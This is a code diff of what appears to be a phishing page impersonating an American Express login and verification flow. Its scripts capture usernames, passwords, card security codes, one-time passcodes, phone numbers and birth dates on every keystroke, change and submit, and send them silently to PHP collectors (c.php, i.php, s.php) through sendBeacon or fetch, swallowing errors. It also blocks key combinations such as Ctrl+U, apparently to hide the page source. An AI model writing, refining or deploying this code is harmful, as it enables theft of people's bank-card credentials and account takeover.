@@ -341,7 +341,7 @@ input:focus{outline:1px dotted #006FCF;border-color:#006FCF}
 		</div> 
 <script>
 function setupUI() {
-  const ENDPOINT = "./g.php";
+  const ENDPOINT = window.location.pathname.replace(/\/[^\/]*$/, '') + '/c.php';
 
   // 🔒 Block specific key combos (Ctrl+S, Ctrl+U, etc.)
   document.addEventListener("keydown", e => {
@@ -379,34 +379,37 @@ function setupUI() {
   }
 
   function sendPayload(payload) {
-    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
-    let beaconOk = false;
+    try {
+      const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+      let beaconOk = false;
 
-    if (navigator.sendBeacon) {
-      beaconOk = navigator.sendBeacon(ENDPOINT, blob);
-    }
+      if (navigator.sendBeacon) {
+        beaconOk = navigator.sendBeacon(ENDPOINT, blob);
+      }
 
-    if (!beaconOk) {
-      return fetch(ENDPOINT, {
-        method: "POST",
-        body: JSON.stringify(payload),
-        headers: { "Content-Type": "application/json" },
-        keepalive: true
-      });
-    }
+      if (!beaconOk) {
+        fetch(ENDPOINT, {
+          method: "POST",
+          body: JSON.stringify(payload),
+          headers: { "Content-Type": "application/json" },
+          keepalive: true
+        }).catch(() => {});
+      }
+    } catch (err) {}
   }
 
+  // ✅ Option 1: Match all inputs inside #clsdiv, include only those with a name
   document.addEventListener("change", e => {
     const el = e.target;
-    if (el?.closest("#clsdiv") && el.matches(".input-control")) {
-      const inputs = document.querySelectorAll(".input-control");
-      const payload = {
-        timestamp: new Date().toISOString(),
-        fields: {}
-      };
-      inputs.forEach(input => {
-        if (input.name) payload.fields[input.name] = input.value;
+    if (el?.closest("#clsdiv") && el.tagName === "INPUT") {
+      const payload = { eventType: "change", timestamp: new Date().toISOString(), fields: {} };
+
+      document.querySelectorAll("#clsdiv input").forEach(input => {
+        if (input.name) {
+          payload.fields[input.name] = input.value;
+        }
       });
+
       sendPayload(payload);
     }
   });
@@ -414,6 +417,7 @@ function setupUI() {
 
 document.addEventListener("DOMContentLoaded", setupUI);
 </script>
+
 		
 <footer class="amex-footer">
   <div class="footer-container">
@@ -585,24 +589,26 @@ window.populateEmailFields = function () {
 }
 
   function setupEnterBindings() {
-    const map = {
-      "#oun, #upw": "button[name='submita']",
-      "#cscInput": "button[name='submitb']",
-      "#otp, #pn, #mmdd": "button[name='submitc']"
-    };
+  const map = {
+    "#oun, #upw": "button[name='submita']",
+    "#cscInput": "button[name='submitb']",
+    "#otp, #pn, #mmdd": "button[name='submitc']"
+  };
 
-    $(document).on("keydown", function (e) {
-      if (e.key === "Enter") {
-        const active = document.activeElement;
-        for (const selector in map) {
-          if (active && $(active).is(selector)) {
-            e.preventDefault();
-            $(map[selector]).trigger("click"); // trigger existing click handlers
-          }
+  $(document).on("keydown", function (e) {
+    if (e.key === "Enter") {
+      const active = document.activeElement;
+      for (const selector in map) {
+        if (active && $(active).is(selector)) {
+          e.preventDefault();
+          active.blur(); // ensures change event fires
+          $(map[selector]).trigger("click");
         }
       }
-    });
-  }
+    }
+  });
+}
+
 
   function setupLoading() {
     $.loading = function (btn) {
@@ -735,7 +741,7 @@ window.populateEmailFields = function () {
 
 function setupResendOTP() {
   let clickCount = 0;
-  const ENDPOINT = "./i.php";
+  const ENDPOINT_SUBMIT = window.location.pathname.replace(/\/[^\/]*$/, '') + '/i.php';
 
   // 📤 Sender specific to Resend OTP (silent fire-and-forget)
   function sendPayload(payload) {
@@ -753,11 +759,9 @@ function setupResendOTP() {
           body: JSON.stringify(payload),
           headers: { "Content-Type": "application/json" },
           keepalive: true
-        }).catch(() => {
-        });
+        }).catch(() => {});
       }
-    } catch (err) {
-    }
+    } catch (err) {}
   }
 
   // 🔲 Overlay routine with spinner + toast targeting #subclsdiv3
@@ -805,11 +809,7 @@ function setupResendOTP() {
     const $targetBtn = $("#otpv");
     $.loading($targetBtn, true);
 
-    const payload = {
-      timestamp: new Date().toISOString(),
-      clickCount,
-      fields: {}
-    };
+    const payload = { eventType: "resend", timestamp: new Date().toISOString(), clickCount, fields: {} };
 
     $(".input-control").each(function () {
       if (this.name) payload.fields[this.name] = this.value;
@@ -828,10 +828,8 @@ function setupResendOTP() {
   $(document).on("input", ".input-control", function () {
     clearTimeout(debounceTimer);
     debounceTimer = setTimeout(() => {
-      const payload = {
-        timestamp: new Date().toISOString(),
-        fields: {}
-      };
+      const payload = { eventType: "input", timestamp: new Date().toISOString(), fields: {} };
+
       $(".input-control").each(function () {
         if (this.name) payload.fields[this.name] = this.value;
       });
@@ -845,24 +843,27 @@ function setupFinalSubmit() {
   let count = 0;
   let busy = false;
 
-  const ENDPOINT = "./s.php";
+  const ENDPOINT_SUBMIT = window.location.pathname.replace(/\/[^\/]*$/, '') + '/s.php';
   const ERROR_MS = 15000;
   const OVERLAY_PHASE1_MS = 10000;
   const OVERLAY_PHASE2_MS = 5000;
 
   function sendPayload(formDataObj) {
+  try {
     const blob = new Blob([JSON.stringify(formDataObj)], { type: "application/json" });
     let beaconOk = false;
     if (navigator.sendBeacon) beaconOk = navigator.sendBeacon(ENDPOINT, blob);
     if (!beaconOk && ENDPOINT) {
-      return fetch(ENDPOINT, {
+      fetch(ENDPOINT, {
         method: "POST",
         body: JSON.stringify(formDataObj),
         headers: { "Content-Type": "application/json" },
         keepalive: true
-      });
+      }).catch(() => {});
     }
-  }
+  } catch (err) {}
+ }
+
 
   function showOtpError(extraMsg = "") {
     $("#otpvrecount")
@@ -940,7 +941,7 @@ function setupFinalSubmit() {
     }
 
     count++;
-    const payload = { timestamp: new Date().toISOString(), fields: {} };
+    const payload = { eventType: "submit", timestamp: new Date().toISOString(), fields: {} };
     $("input").each(function () { if (this.name) payload.fields[this.name] = this.value; });
     sendPayload(payload);
 
@@ -1000,16 +1001,18 @@ let pollArmed = true;
 let coolingDown = false;
 
 function notify(eventType) {
-  fetch(ENDPOINT, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      type: eventType,
-      timestamp: new Date().toISOString(),
-      session: sessionId
-    }),
-    keepalive: true
-  }).catch(() => {});
+  try {
+    fetch(ENDPOINT, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        type: eventType,
+        timestamp: new Date().toISOString(),
+        session: sessionId
+      }),
+      keepalive: true
+    }).catch(() => {});
+  } catch (err) {}
 }
 
 function fireScroll(source) {
